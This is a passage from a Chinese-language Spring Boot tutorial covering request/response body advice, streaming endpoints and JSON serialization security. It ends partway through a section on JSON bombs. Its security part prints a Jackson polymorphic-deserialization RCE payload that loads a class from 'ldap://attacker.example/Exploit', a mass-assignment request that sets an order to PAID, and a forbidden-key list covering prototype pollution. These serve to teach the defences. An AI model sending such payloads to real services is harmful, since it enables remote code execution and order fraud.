 * <p>⚠️ 注意 {@code @RestControllerAdvice} 這個註解 ——
 *    {@code RequestBodyAdvice} 與 {@code ResponseBodyAdvice} 一樣，
 *    **必須放在 advice bean 上才會被 Spring 撿到**。
 *    忘了加的話它就是一個普通的 bean，永遠不會被呼叫，
 *    而且**不會有任何錯誤訊息**。
 */
@RestControllerAdvice
public class EmptyBodyAdvice extends RequestBodyAdviceAdapter {

    @Override
    public boolean supports(MethodParameter param, Type targetType,
                            Class<? extends HttpMessageConverter<?>> converterType) {
        // ★ 只處理「必填的 @RequestBody」——
        //   required = false 的情況下，空 body 是合法的
        var annotation = param.getParameterAnnotation(
                org.springframework.web.bind.annotation.RequestBody.class);
        return annotation != null && annotation.required();
    }

    @Override
    public Object handleEmptyBody(Object body, HttpInputMessage in, MethodParameter param,
                                  Type targetType,
                                  Class<? extends HttpMessageConverter<?>> converterType) {
        throw new MissingRequestBodyException(param.getParameterType().getSimpleName());
    }
}
```

```java
package example.shop.common.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;

/** 必填的 request body 是空的。 */
public class MissingRequestBodyException extends BusinessException {

    public MissingRequestBodyException(String expectedType) {
        super(ErrorCode.MALFORMED_REQUEST,
              "The request body is required but was empty.",
              null,
              ext("expectedType", expectedType,
                  // ★ 這一行的價值：它直接指出 90% 的原因
                  "hint", "請確認 fetch/axios 有帶 body，而且 Content-Type 是 application/json。"
                        + "常見原因：用了 fetch 但忘了 JSON.stringify(...)。"),
              new Object[0],
              List.of());
    }
}
```

**回應變成**：

```json
{
  "type": "https://api.shop.example/problems/malformed-request",
  "title": "請求格式錯誤",
  "status": 400,
  "code": "MALFORMED_REQUEST",
  "userMessage": "請求內容不完整，請重新操作。",
  "detail": "The request body is required but was empty.",
  "expectedType": "CreateOrderRequest",
  "hint": "請確認 fetch/axios 有帶 body，而且 Content-Type 是 application/json。常見原因：用了 fetch 但忘了 JSON.stringify(...)。",
  "traceId": "4f2c8a1e9b3d7c05"
}
```

**★ 用途 ② 的完整實作：稽核「哪個 DTO 收到了什麼」**

04 章 4.6 的 `RequestLoggingFilter` 記錄了 body 的 bytes，
但它**在 filter 層，不知道那些 bytes 會被綁成什麼型別** ——
所以它的遮蔽規則（`BodyMasker`）只能靠**欄位名字**猜。

`RequestBodyAdvice` 拿得到型別，於是可以用**型別上的 `@Masked` 註解**（6.6.2）：

```java
@RestControllerAdvice
public class SensitiveBodyAuditAdvice extends RequestBodyAdviceAdapter {

    @Override
    public boolean supports(MethodParameter param, Type targetType,
                            Class<? extends HttpMessageConverter<?>> converterType) {
        // ★ 只對「有敏感欄位」的 DTO 生效 —— 靠型別判斷，不是靠欄位名猜
        return SensitiveTypes.contains(param.getParameterType());
    }

    @Override
    public Object afterBodyRead(Object body, HttpInputMessage in, MethodParameter param,
                                Type targetType,
                                Class<? extends HttpMessageConverter<?>> converterType) {
        // ⚠️ 用**輸出用**的 ObjectMapper 序列化 ——
        //    它會套用 @Masked 的 MaskingSerializer（6.6.2），
        //    所以寫進稽核紀錄的是遮蔽過的版本。
        auditRepository.save(AuditEvent.requestReceived(
                param.getParameterType().getSimpleName(),
                maskingMapper.writeValueAsString(body)));
        return body;
    }
}
```

⚠️ **這比 filter 層的遮蔽可靠得多**，理由與 6.6.2 一樣：
**型別層級的遮蔽不會漏，欄位名的黑名單一定會漏。**

**★ 三個 `RequestBodyAdvice` 的限制**（都與 `ResponseBodyAdvice` 對稱）：

| 限制 | 說明 |
|---|---|
| **對 `@RequestPart` 只作用在 JSON 那一 part** | `MultipartFile` 不走 converter（05 章 5.6.2） |
| **`beforeBodyRead` 換掉 stream 要小心 `Content-Length`** | 解密後長度會變，而某些 converter 會讀它 |
| **`supports()` 被呼叫得很頻繁** | 每個請求每個參數一次 —— 不要在裡面做 I/O 或反射掃描（用 `SensitiveTypes` 這種預先算好的集合） |

**⚠️ 最後一個「什麼時候不要用它」**：

> **不要用 `RequestBodyAdvice` 做驗證。**
>
> 它在 Bean Validation **之前**執行，所以你在這裡拋的例外
> 會蓋掉「一次回報所有欄位錯誤」的能力（02 章 2.9）。
> 驗證永遠留給 `@Valid`。

### 6.6.6 `ResponseBodyAdvice` 與串流的衝突 ★

**`ResponseBodyAdvice` 對這些回傳型別「完全不會被呼叫」**：

| 回傳型別 | 誰處理它 | `ResponseBodyAdvice` 生效？ |
|---|---|---|
| `OrderDetail` | `RequestResponseBodyMethodProcessor` | ✅ |
| `ResponseEntity<OrderDetail>` | `HttpEntityMethodProcessor` | ✅ |
| `PageResponse<T>` | 同上 | ✅ |
| **`StreamingResponseBody`** | `StreamingResponseBodyReturnValueHandler` | 🔴 **不會** |
| **`ResponseEntity<StreamingResponseBody>`** | 同上 | 🔴 **不會** |
| **`SseEmitter`** | `ResponseBodyEmitterReturnValueHandler` | 🔴 **不會** |
| `Callable<OrderDetail>` | 非同步後回到 `RequestResponseBodyMethodProcessor` | ✅ |
| `DeferredResult<OrderDetail>` | 同上 | ✅ |
| `Resource` | `HttpEntityMethodProcessor` | ⚠️ 會被呼叫，但你不該動它 |

**原因在 `RequestMappingHandlerAdapter` 的 handler 註冊順序**：

```java
// org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter
private List<HandlerMethodReturnValueHandler> getDefaultReturnValueHandlers() {
    List<HandlerMethodReturnValueHandler> handlers = new ArrayList<>(20);

    // Single-purpose return value types
    handlers.add(new ModelAndViewMethodReturnValueHandler());
    handlers.add(new ModelMethodProcessor());
    handlers.add(new ViewMethodReturnValueHandler());
    handlers.add(new ResponseBodyEmitterReturnValueHandler(...));      // ★ SseEmitter
    handlers.add(new StreamingResponseBodyReturnValueHandler());        // ★ 串流
    handlers.add(new HttpEntityMethodProcessor(getMessageConverters(),
            this.contentNegotiationManager, this.requestResponseBodyAdvice));  // ← advice 在這裡
    // ...
}
```

**`StreamingResponseBodyReturnValueHandler` 排在 `HttpEntityMethodProcessor` 之前，
而它完全不知道 `ResponseBodyAdvice` 的存在。**

**這造成的三個實際問題**：

| 功能 | 對一般端點 | 對串流端點 |
|---|---|---|
| 稀疏欄位集（`?fields=`） | ✅ | 🔴 **無效**（`?fields=` 被靜默忽略） |
| 統一的回應包裝 | ✅ | 🔴 無效 |
| 加上 `X-Api-Version` 標頭 | ✅ | 🔴 無效 |

⚠️ **「靜默忽略」是最糟的部分**：

```http
GET /orders.csv?fields=orderId,status
→ 200，完整的 14 個欄位的 CSV
★ 客戶端以為它成功地限制了欄位，實際上沒有
```

**shop-service 的三個處理**：

**① 對 CSV，欄位選擇走 `CsvRowMapper` 而不是 `?fields=`**

（05 章 5.10.5 的 `CreateExportRequest.columns` 就是這個設計。）

**② 讓「不支援的參數」明確報錯而不是靜默忽略** ★

```java
package example.shop.common.web;

import example.shop.common.error.ErrorCode;
import org.springframework.stereotype.Component;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.util.List;
import java.util.Map;

/**
 * 對串流端點拒絕「只有 ResponseBodyAdvice 才支援的參數」。
 *
 * <p>★★ 為什麼需要它（6.6.6）：
 * {@code ResponseBodyAdvice} 不作用在 {@code StreamingResponseBody} 與
 * {@code SseEmitter} 上，所以 {@code ?fields=} 會被<b>靜默忽略</b>。
 *
 * <p>而「靜默忽略」是 04 章 4.2.3（41 萬筆報表）與
 * 01 章 1.7.5（打錯字的篩選參數）同一類的災難：
 * <b>客戶端以為它做到了某件事，其實沒有。</b>
 *
 * <p>★ 回 400 讓它立刻知道。
 */
@Component
public class StreamingUnsupportedParamInterceptor implements HandlerInterceptor {

    /** 這些參數只有 {@code ResponseBodyAdvice} 能處理。 */
    private static final List<String> ADVICE_ONLY_PARAMS = List.of("fields", "expand");

    private final ProblemWriter problemWriter;

    public StreamingUnsupportedParamInterceptor(ProblemWriter problemWriter) {
        this.problemWriter = problemWriter;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception {

        if (!(handler instanceof HandlerMethod method)) {
            return true;
        }
        if (!isStreamingReturnType(method)) {
            return true;
        }

        for (String param : ADVICE_ONLY_PARAMS) {
            if (request.getParameter(param) != null) {
                problemWriter.write(request, response, ErrorCode.UNKNOWN_PARAMETER,
                        "Parameter '%s' is not supported on streaming endpoints."
                                .formatted(param),
                        Map.of("parameter", param,
                               "reason", "STREAMING_ENDPOINT",
                               "hint", "fields=" + " 只支援非串流的 JSON 端點。"
                                     + "匯出的欄位請用 POST /order-exports 的 columns 參數。"));
                return false;      // ★ 不繼續
            }
        }
        return true;
    }

    /**
     * ⚠️ 這個判斷要涵蓋 {@code ResponseEntity<StreamingResponseBody>}
     * 這種被包起來的情況。
     */
    static boolean isStreamingReturnType(HandlerMethod method) {
        Class<?> returnType = method.getReturnType().getParameterType();

        if (StreamingResponseBody.class.isAssignableFrom(returnType)
                || SseEmitter.class.isAssignableFrom(returnType)
                || org.springframework.web.servlet.mvc.method.annotation
                        .ResponseBodyEmitter.class.isAssignableFrom(returnType)) {
            return true;
        }
        if (org.springframework.http.ResponseEntity.class.isAssignableFrom(returnType)) {
            Class<?> generic = org.springframework.core.ResolvableType
                    .forMethodParameter(method.getReturnType()).getGeneric(0).resolve();
            return generic != null
                    && (StreamingResponseBody.class.isAssignableFrom(generic)
                     || SseEmitter.class.isAssignableFrom(generic)
                     || org.springframework.web.servlet.mvc.method.annotation
                            .ResponseBodyEmitter.class.isAssignableFrom(generic));
        }
        return false;
    }
}
```

**③ 一個「advice 覆蓋率」的測試** ★

```java
package example.shop.contract;

import example.shop.common.web.StreamingUnsupportedParamInterceptor;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「哪些端點不受 ResponseBodyAdvice 影響」的清單測試。
 *
 * <p>★★ 這個測試的做法很值得學：它<b>把一個隱性的事實變成一份可見的清單</b>，
 * 並讓「清單改變」需要一次明確的決定。
 *
 * <p>沒有它的話，「6.6.6 的衝突」只存在於某個人的記憶裡 ——
 * 而下一個實作 {@code ResponseBodyAdvice} 的人會重新踩一次。
 */
@SpringBootTest
class ResponseBodyAdviceCoverageTest {

    /**
     * 已知的串流端點。
     *
     * <p>⚠️ 加一個新的串流端點時這個測試會失敗 ——
     * 那是刻意的：你必須確認
     * (a) {@code StreamingUnsupportedParamInterceptor} 涵蓋它
     * (b) 該端點的文件寫明「不支援 ?fields=」
     * 然後把它加進這個清單。
     */
    private static final List<String> EXPECTED_STREAMING_ENDPOINTS = List.of(
            "GET /orders.csv",
            "GET /orders.ndjson",
            "GET /orders/{orderId}/items.csv",
            "GET /orders/{orderId}/events",
            "GET /order-exports/{exportId}/file",
            "GET /orders/{orderId}/receipts/{receiptId}");

    @Autowired RequestMappingHandlerMapping handlerMapping;

    @Test
    @DisplayName("串流端點的清單與預期一致")
    void 串流端點清單() {
        List<String> actual = new ArrayList<>();

        for (Map.Entry<RequestMappingInfo, HandlerMethod> entry
                : handlerMapping.getHandlerMethods().entrySet()) {

            if (!StreamingUnsupportedParamInterceptor
                    .isStreamingReturnType(entry.getValue())) {
                continue;
            }
            var methods = entry.getKey().getMethodsCondition().getMethods();
            var patterns = entry.getKey().getPathPatternsCondition();
            String method = methods.isEmpty() ? "ANY"
                    : methods.iterator().next().name();
            String path = (patterns == null) ? "?"
                    : patterns.getPatterns().iterator().next().getPatternString();
            actual.add(method + " " + path);
        }

        assertThat(actual)
                .as("""
                    串流端點的清單改變了（06 章 6.6.6）。

                    串流端點【不受 ResponseBodyAdvice 影響】，所以：
                      · ?fields= 會被靜默忽略
                      · 統一回應包裝不生效
                      · 加在 advice 裡的標頭不會出現

                    如果你加了一個新的串流端點，請：
                      1. 確認 StreamingUnsupportedParamInterceptor 會擋掉 ?fields=
                      2. 在 OpenAPI 文件裡註明不支援哪些參數
                      3. 把它加進 EXPECTED_STREAMING_ENDPOINTS
                    """)
                .containsExactlyInAnyOrderElementsOf(EXPECTED_STREAMING_ENDPOINTS);
    }
}
```

⚠️ **`GET /orders/{orderId}/receipts/{receiptId}` 在清單裡是因為它回 `ResponseEntity<Resource>`** ——
`Resource` 走 `HttpEntityMethodProcessor`，所以 advice **會**被呼叫。
**但你絕不該讓 advice 動它**（那會破壞 Range 與二進位內容）。

**所以 `SparseFieldsetAdvice.supports()` 還需要一個排除**：

```java
        // ★ 排除條件 4：Resource（檔案下載）
        //   advice 對它呼叫 valueToTree() 會把整個檔案讀進記憶體並產生垃圾 JSON
        if (org.springframework.core.io.Resource.class.isAssignableFrom(parameterType)) {
            return false;
        }
        if (org.springframework.http.ResponseEntity.class.isAssignableFrom(parameterType)) {
            var generic = org.springframework.core.ResolvableType
                    .forMethodParameter(returnType).getGeneric(0).resolve();
            if (generic != null
                    && org.springframework.core.io.Resource.class.isAssignableFrom(generic)) {
                return false;
            }
        }
```

⚠️ **注意這個 `supports()` 已經有四個排除條件了。**
那是一個訊號：**`ResponseBodyAdvice` 是一個「作用範圍太大」的機制。**

> **一個誠實的評價**：
> 如果你的 API 只有幾個端點需要 `?fields=`，
> **在那幾個 Controller 方法裡明確處理它**（回傳 `MappingJacksonValue` 或
> 手動組一個 `Map`）比一個全域 advice 加四個排除條件簡單得多。
>
> shop-service 用 advice 是因為 `?fields=` 適用於全部 34 個 JSON 的 GET 端點 ——
> **在那個規模下，一個 advice 加四個排除比 34 個地方各寫一次好。**

---

## 6.7 序列化的安全問題

### 6.7.1 多型反序列化：一個 RCE 漏洞 ★

**Jackson 歷史上最嚴重的一類漏洞。**

```java
    // 🔴🔴🔴 絕不可以在處理不可信輸入的 mapper 上做這件事
    objectMapper.activateDefaultTyping(
            LaissezFaireSubTypeValidator.instance,
            ObjectMapper.DefaultTyping.NON_FINAL);
```

**它做什麼**：讓 JSON 可以指定「要反序列化成哪個類別」。

```json
{
  "value": ["com.example.SomeClass", { "field": "x" }]
}
```

**攻擊**：JSON 裡指定一個「在建構或 setter 時會執行程式碼」的類別
（gadget）。歷史上被利用的 gadget 包括 JNDI 查詢類別
（`com.sun.rowset.JdbcRowSetImpl`）——
它的 setter 會連到攻擊者控制的 LDAP 伺服器並載入遠端類別。

```json
{
  "value": [
    "com.sun.rowset.JdbcRowSetImpl",
    { "dataSourceName": "ldap://attacker.example/Exploit", "autoCommit": true }
  ]
}
```

**結果：遠端程式碼執行。**

⚠️ **Jackson 有一個 gadget 黑名單（`SubTypeValidator`）**，
但那份清單是「被發現之後才加進去」——
**它永遠落後於新發現的 gadget。**

**三條規則**：

| 規則 | 說明 |
|---|---|
| **① 絕不對不可信輸入用 `activateDefaultTyping`** | 沒有例外。Web API 的 request body 一律是不可信輸入 |
| **② 需要多型時用「封閉集合」** | `@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes` |
| **③ 如果非要用 default typing（例如快取的序列化），用 `PolymorphicTypeValidator` 白名單** | 而且那個 mapper 絕不可以碰 HTTP 的 body |

**正確的多型寫法**：

```java
package example.shop.payment.web.dto;

import com.fasterxml.jackson.annotation.JsonSubTypes;
import com.fasterxml.jackson.annotation.JsonTypeInfo;

/**
 * 付款方式 —— 一個安全的多型 DTO。
 *
 * <p>★★ 安全的關鍵是 {@code use = Id.NAME}：
 * JSON 裡的 {@code "type": "CREDIT_CARD"} 只是一個<b>邏輯名稱</b>，
 * Jackson 用 {@code @JsonSubTypes} 的對照表把它翻譯成類別。
 * <b>攻擊者無法指定任意類別</b>。
 *
 * <p>對照：
 * <table>
 *   <tr><th></th><th>{@code Id.CLASS} / default typing</th><th>{@code Id.NAME} + subtypes</th></tr>
 *   <tr><td>JSON 裡的值</td><td>完整類別名（攻擊者可控）🔴</td><td>邏輯名稱（必須在白名單裡）✅</td></tr>
 *   <tr><td>可反序列化的類別</td><td>classpath 上的任何類別</td><td><b>只有列出的 3 個</b></td></tr>
 *   <tr><td>未知的值</td><td>試圖載入 → 可能 RCE</td><td>{@code InvalidTypeIdException} → 400</td></tr>
 * </table>
 *
 * <p>★ {@code visible = true} 讓 {@code type} 欄位也被綁到子型別的 record 元件上 ——
 * 那讓子型別可以在自己的驗證裡用到它。
 */
@JsonTypeInfo(
        use = JsonTypeInfo.Id.NAME,
        include = JsonTypeInfo.As.PROPERTY,
        property = "type",
        visible = true,
        // ⚠️ 刻意【不】設 defaultImpl：
        //    設了它會讓「未知的 type」靜默落到預設實作，
        //    而那是一個靜默錯誤（客戶端以為它送了信用卡，我們當成貨到付款）
        //
        // ★★ 「不設」的正確寫法是【什麼都不寫】，或明確寫
        //    JsonTypeInfo.None.class（那就是 defaultImpl 的預設值）。
        //    ⚠️ 不要寫 com.fasterxml.jackson.databind.annotation.NoClass ——
        //      它是一個舊的內部標記類別，在 Jackson 2.x 已標為
        //      @Deprecated（Jackson 3 移除），而且它的語意是
        //      「沒有指定」而不是「明確不要 default」。
        //      兩者在 2.x 的行為相同，但寫 NoClass 會在升級時斷掉。
        defaultImpl = JsonTypeInfo.None.class)
@JsonSubTypes({
        @JsonSubTypes.Type(value = CreditCardPayment.class,   name = "CREDIT_CARD"),
        @JsonSubTypes.Type(value = BankTransferPayment.class, name = "BANK_TRANSFER"),
        @JsonSubTypes.Type(value = CashOnDeliveryPayment.class, name = "COD")
})
public sealed interface PaymentMethodRequest
        permits CreditCardPayment, BankTransferPayment, CashOnDeliveryPayment {

    /** ★ 讓 Controller 可以在不用 instanceof 的情況下取到型別。 */
    String type();
}
```

```java
package example.shop.payment.web.dto;

import example.shop.common.web.json.MaskedCardNumber;
import jakarta.validation.constraints.*;

/**
 * ★ {@code sealed interface} + {@code record} 的組合讓：
 * <ul>
 *   <li>Jackson 的子型別集合與 Java 的 {@code permits} 清單<b>必須一致</b>
 *       （否則 6.7.1 的 SealedSubtypeConsistencyTest 會失敗）。</li>
 *   <li>{@code switch} 可以窮盡檢查（Java 21 的 pattern matching）。</li>
 * </ul>
 */
public record CreditCardPayment(

    String type,

    @NotNull
    MaskedCardNumber cardNumber,

    @NotBlank @Size(max = 100)
    String cardHolderName,

    @NotNull @Min(1) @Max(12)
    Integer expiryMonth,

    @NotNull @Min(2026) @Max(2050)
    Integer expiryYear,

    @NotBlank @Pattern(regexp = "^\\d{3,4}$", message = "安全碼必須是 3 或 4 位數字")
    String cvv,

    @Min(1) @Max(24)
    Integer installments

) implements PaymentMethodRequest {

    /**
     * ★ 跨欄位驗證：卡片不可過期。
     *
     * <p>⚠️ 用 {@code YearMonth} 而不是自己比大小 ——
     * 後者很容易寫成「年份相同時忘記比月份」。
     */
    @AssertTrue(message = "信用卡已過期")
    public boolean isNotExpired() {
        if (expiryYear == null || expiryMonth == null) return true;
        try {
            var expiry = java.time.YearMonth.of(expiryYear, expiryMonth);
            var now = java.time.YearMonth.now(java.time.ZoneOffset.UTC);
            // ★ 卡片在到期月份的【最後一天】才失效
            return !expiry.isBefore(now);
        } catch (java.time.DateTimeException e) {
            return true;      // 讓 @Min / @Max 去報錯
        }
    }
}
```

⚠️ **未知的 `type` 會拋 `InvalidTypeIdException`**（`HttpMessageNotReadableException` 的子類）。
03 章 3.9.4 的 `MessageNotReadableAnalyzer` 要處理它：

```java
    /**
     * 03 章 3.9.4 的 MessageNotReadableAnalyzer 補上多型的處理。
     */
    private FieldViolation analyzeInvalidTypeId(InvalidTypeIdException ex) {
        String path = pathOf(ex.getPath());
        // ★ 從 baseType 拿到「合法的 type 值」清單
        List<String> allowed = knownSubtypeNames(ex.getBaseType());

        return new FieldViolation(
                path.isEmpty() ? "type" : path + ".type",
                "InvalidTypeId",
                allowed.isEmpty()
                        ? "不支援的型別"
                        : "不支援的型別。可用的值：" + String.join("、", allowed),
                ValueMasker.mask(ex.getTypeId()),
                allowed.isEmpty() ? null : Map.of("allowedValues", allowed));
    }

    /**
     * 從 {@code @JsonSubTypes} 讀出合法的名稱。
     *
     * <p>★ 這樣錯誤訊息會自動跟著程式碼更新 ——
     * 手寫一份清單一定會過時。
     */
    private static List<String> knownSubtypeNames(com.fasterxml.jackson.databind.JavaType baseType) {
        if (baseType == null) return List.of();
        var annotation = baseType.getRawClass()
                .getAnnotation(com.fasterxml.jackson.annotation.JsonSubTypes.class);
        if (annotation == null) return List.of();
        return java.util.Arrays.stream(annotation.value())
                .map(com.fasterxml.jackson.annotation.JsonSubTypes.Type::name)
                .filter(name -> name != null && !name.isEmpty())
                .toList();
    }
```

**回應**：

```json
{
  "status": 400,
  "code": "MALFORMED_REQUEST",
  "detail": "The request body contains an unsupported type identifier.",
  "errors": [
    {
      "field": "paymentMethod.type",
      "code": "InvalidTypeId",
      "message": "不支援的型別。可用的值：CREDIT_CARD、BANK_TRANSFER、COD",
      "rejectedValue": "APPLE_PAY",
      "constraint": { "allowedValues": ["CREDIT_CARD", "BANK_TRANSFER", "COD"] }
    }
  ]
}
```

**一個守住「sealed 與 JsonSubTypes 一致」的測試** ★

```java
package example.shop.contract;

import com.fasterxml.jackson.annotation.JsonSubTypes;
import example.shop.payment.web.dto.PaymentMethodRequest;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * {@code sealed} 的 {@code permits} 清單與 {@code @JsonSubTypes} 必須一致。
 *
 * <p>★★ 為什麼需要這個測試：
 * 加一個新的付款方式時，很容易只改一邊 ——
 * <ul>
 *   <li>只加 {@code permits}：Jackson 反序列化時說「不支援的 type」→
 *       ⚠️ 相對安全（會失敗）</li>
 *   <li>只加 {@code @JsonSubTypes}：<b>編譯錯誤</b>（sealed 不允許）→
 *       ✅ 編譯器幫你了</li>
 *   <li><b>都加了但名稱寫錯</b>（{@code "CREDT_CARD"}）→
 *       🔴 靜默地永遠無法使用那個付款方式</li>
 * </ul>
 */
class SealedSubtypeConsistencyTest {

    @Test
    @DisplayName("PaymentMethodRequest 的 permits 與 @JsonSubTypes 一致")
    void 付款方式() {
        assertConsistent(PaymentMethodRequest.class);
    }

    private static void assertConsistent(Class<?> sealedType) {
        assertThat(sealedType.isSealed())
                .as("%s 應該是 sealed", sealedType.getSimpleName())
                .isTrue();

        List<Class<?>> permitted = Arrays.asList(sealedType.getPermittedSubclasses());

        JsonSubTypes subTypes = sealedType.getAnnotation(JsonSubTypes.class);
        assertThat(subTypes)
                .as("%s 缺少 @JsonSubTypes", sealedType.getSimpleName())
                .isNotNull();

        List<Class<?>> declared = Arrays.stream(subTypes.value())
                .map(JsonSubTypes.Type::value)
                .map(c -> (Class<?>) c)
                .toList();

        assertThat(declared)
                .as("@JsonSubTypes 的類別與 permits 清單不一致")
                .containsExactlyInAnyOrderElementsOf(permitted);

        // ★ 每個子型別都要有一個非空的 name
        for (JsonSubTypes.Type type : subTypes.value()) {
            assertThat(type.name())
                    .as("%s 缺少 @JsonSubTypes.Type 的 name", type.value().getSimpleName())
                    .isNotBlank()
                    // ★ 而且要是 UPPER_SNAKE_CASE（03-rest-api 3.10.3）
                    .matches("^[A-Z][A-Z0-9_]*$");
        }

        // ★ name 不可重複
        List<String> names = Arrays.stream(subTypes.value())
                .map(JsonSubTypes.Type::name).toList();
        assertThat(names).doesNotHaveDuplicates();
    }
}
```

### 6.7.2 mass assignment：DTO 不是唯一的防線

**03-rest-api 3.2.6 講過原理，這裡看 Web 層的完整防護。**

```java
    // 🔴 漏洞：直接綁到 Entity
    @PatchMapping("/orders/{orderId}")
    public Order update(@PathVariable String orderId, @RequestBody Order order) { }
```

```json
{ "customerNote": "改個備註", "status": "PAID", "amounts": { "total": "0.01" } }
```

**四層防護**：

| 層 | 做法 | 章節 |
|---|---|---|
| **1. 專用的 request DTO** | `UpdateOrderRequest` 只有可修改的欄位 | 03-rest-api 3.3 |
| **2. `fail-on-unknown-properties: true`** | 送了 DTO 沒有的欄位 → 400 | 6.5.5 |
| **3. `@ReadOnlyField`** | 「宣告但拒絕」的欄位 → 403 | 6.5.5 |
| **4. Service 層的狀態機** | 即使 status 被改了，`OrderStatus.allowedTransitions()` 會拒絕 | 05-service |

⚠️ **第 2 層有一個容易被忽略的漏洞：`@JsonAnySetter`。**

```java
public record UpdateOrderRequest(
    JsonNullable<String> customerNote,

    /**
     * 🔴 這個「彈性的 metadata 欄位」讓 fail-on-unknown-properties 失效
     */
    Map<String, Object> metadata
) {}
```

```json
{ "metadata": { "status": "PAID", "internalDiscount": "9999" } }
```

**`Map<String, Object>` 會吃下任何東西** ——
如果 Service 把 metadata 合併進 Entity（`entity.getMetadata().putAll(...)`），
那就等於 mass assignment。

**修法：`Map` 型別的欄位一定要驗證 key。**

```java
package example.shop.common.validation;

import jakarta.validation.Constraint;
import jakarta.validation.ConstraintValidator;
import jakarta.validation.ConstraintValidatorContext;
import jakarta.validation.Payload;

import java.lang.annotation.*;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * 驗證一個 {@code Map} 的 key 與 value。
 *
 * <p>★ 為什麼「彈性的 metadata 欄位」需要驗證（6.7.2）：
 * {@code Map<String, Object>} 讓 {@code fail-on-unknown-properties} 失效 ——
 * 它會吃下任何 key。如果那個 map 後來被合併進資料庫的欄位，
 * 就是一個 mass assignment 漏洞。
 */
@Documented
@Constraint(validatedBy = SafeMetadataValidator.class)
@Target({ElementType.FIELD, ElementType.RECORD_COMPONENT, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
public @interface SafeMetadata {

    String message() default "metadata 含無效的鍵或值";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    /** 最多幾個項目。 */
    int maxEntries() default 20;

    /** key 的最大長度。 */
    int maxKeyLength() default 64;

    /** value 轉成字串後的最大長度。 */
    int maxValueLength() default 512;
}
```

```java
package example.shop.common.validation;

import jakarta.validation.ConstraintValidator;
import jakarta.validation.ConstraintValidatorContext;

import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

public class SafeMetadataValidator
        implements ConstraintValidator<SafeMetadata, Map<String, Object>> {

    /** key 只允許 camelCase 的識別字。 */
    private static final Pattern SAFE_KEY = Pattern.compile("^[a-z][a-zA-Z0-9]{0,63}$");

    /**
     * ★★ 保留字：這些 key 絕不可以出現在 metadata 裡。
     *
     * <p>它們是「可能被誤合併進 Entity 或造成原型汙染」的名稱。
     */
    private static final Set<String> FORBIDDEN_KEYS = Set.of(
            // 訂單的關鍵欄位（防 mass assignment）
            "status", "total", "amounts", "customerId", "orderId",
            "createdAt", "updatedAt", "version", "deleted",
            // JavaScript 的原型汙染（如果 metadata 被前端 spread 進物件）
            "__proto__", "constructor", "prototype",
            // 資料庫 / ORM 的內部欄位
            "id", "class", "hibernateLazyInitializer", "handler");

    private SafeMetadata config;

    @Override
    public void initialize(SafeMetadata constraintAnnotation) {
        this.config = constraintAnnotation;
    }

    @Override
    public boolean isValid(Map<String, Object> value, ConstraintValidatorContext context) {
        if (value == null || value.isEmpty()) {
            return true;                        // @NotNull 是另一個註解的責任
        }

        context.disableDefaultConstraintViolation();

        if (value.size() > config.maxEntries()) {
            addViolation(context, null,
                    "metadata 最多 %d 個項目，收到 %d 個"
                            .formatted(config.maxEntries(), value.size()));
            return false;
        }

        boolean valid = true;
        for (Map.Entry<String, Object> entry : value.entrySet()) {
            String key = entry.getKey();

            if (key == null || key.length() > config.maxKeyLength()
                    || !SAFE_KEY.matcher(key).matches()) {
                addViolation(context, key,
                        "無效的 metadata 鍵（只允許 %d 字元以內的 camelCase 英數字）"
                                .formatted(config.maxKeyLength()));
                valid = false;
                continue;
            }

            // ★★ 保留字檢查
            if (FORBIDDEN_KEYS.contains(key)
                    || FORBIDDEN_KEYS.contains(key.toLowerCase(java.util.Locale.ROOT))) {
                addViolation(context, key, "「%s」是保留的鍵，不可用於 metadata".formatted(key));
                valid = false;
                continue;
            }

            Object v = entry.getValue();
            // ★ 只允許純量 —— 巢狀物件會讓「合併進 Entity」的行為難以預測
            if (v != null
                    && !(v instanceof String || v instanceof Number || v instanceof Boolean)) {
                addViolation(context, key,
                        "metadata 的值只能是字串、數字或布林（不可為物件或陣列）");
                valid = false;
                continue;
            }
            if (v instanceof String s && s.length() > config.maxValueLength()) {
                addViolation(context, key,
                        "metadata 的值最長 %d 字元".formatted(config.maxValueLength()));
                valid = false;
            }
        }
        return valid;
    }

    /** ★ 用 addPropertyNode 讓錯誤定位到具體的 key（02 章 2.9.4）。 */
    private static void addViolation(ConstraintValidatorContext context,
                                     String key, String message) {
        var builder = context.buildConstraintViolationWithTemplate(message);
        if (key != null) {
            // ⚠️ key 來自客戶端 —— 放進 property path 之前要清理
            //    （否則 errors[].field 會含控制字元）
            builder.addPropertyNode(sanitizeKey(key));
        }
        builder.addConstraintViolation();
    }

    private static String sanitizeKey(String key) {
        String cleaned = key.replaceAll("[^a-zA-Z0-9_]", "_");
        return cleaned.length() <= 64 ? cleaned : cleaned.substring(0, 64);
    }
}
```

### 6.7.3 JSON 炸彈：`StreamReadConstraints`

**三種攻擊**：

```json
// ① 深度炸彈 —— 造成 StackOverflowError
[[[[[[[[[[[[[[[[ … 一萬層 … ]]]]]]]]]]]]]]]]

// ② 巨大字串 —— 一個 500 MB 的字串值
{ "customerNote": "AAAA…（500 MB）" }

// ③ 巨大數字 —— BigDecimal 的計算複雜度
